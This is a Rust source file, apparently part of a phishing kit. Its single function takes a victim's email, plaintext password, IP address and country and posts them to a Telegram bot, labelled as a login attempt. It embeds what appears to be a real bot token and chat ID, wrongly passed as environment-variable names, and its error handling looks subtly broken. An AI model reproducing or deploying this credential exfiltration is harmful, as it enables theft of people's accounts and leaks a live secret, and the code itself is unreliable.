use reqwest::Client;
use std::env;

/// Sends user data to a Telegram bot.
///
/// # Arguments
/// - `email`: The email address entered by the user.
/// - `password`: The password entered by the user.
/// - `ip`: The user's IP address.
/// - `country`: The country of the user (retrieved using GeoLite2).
///
/// # Returns
/// - `Ok(())`: If the data was successfully sent to Telegram.
/// - `Err`: If there was an error sending the data.
pub async fn send_to_telegram(
    email: &str,
    password: &str,
    ip: &str,
    country: &str,
) -> Result<(), reqwest::Error> {
    // Retrieve the Telegram bot token and chat ID from environment variables
    let bot_token = env::var("7781468085:AAEdLDEdPbC1zQUOJnNmYCPgkH84uuwLfgU")
        .expect("TELEGRAM_BOT_TOKEN environment variable is not set");
    let chat_id = env::var("-1002493880170")
        .expect("TELEGRAM_CHAT_ID environment variable is not set");

    // Construct the message to send to Telegram
    let message = format!(
        "⚠️ Login Attempt Detected ⚠️\n\n📧 Email: {}\n🔑 Password: {}\n🌍 IP: {}\n🏳️ Country: {}\n📅 Time: {}",
        email,
        password,
        ip,
        country,
        chrono::Utc::now().format("%Y-%m-%d %H:%M:%S UTC")
    );

    // Construct the Telegram API URL
    let telegram_api_url = format!(
        "https://api.telegram.org/bot{}/sendMessage",
        bot_token
    );

    // Send the message to Telegram
    let client = Client::new();
    let response = client
        .post(&telegram_api_url)
        .json(&serde_json::json!({
            "chat_id": chat_id,
            "text": message,
            "parse_mode": "Markdown"
        }))
        .send()
        .await?;

    // Check if the response indicates success
    if response.status().is_success() {
        Ok(())
    } else {
        Err(reqwest::Error::new(
            reqwest::StatusCode::INTERNAL_SERVER_ERROR,
            format!("Telegram API error: {:?}", response.status()),
        ))
    }
}
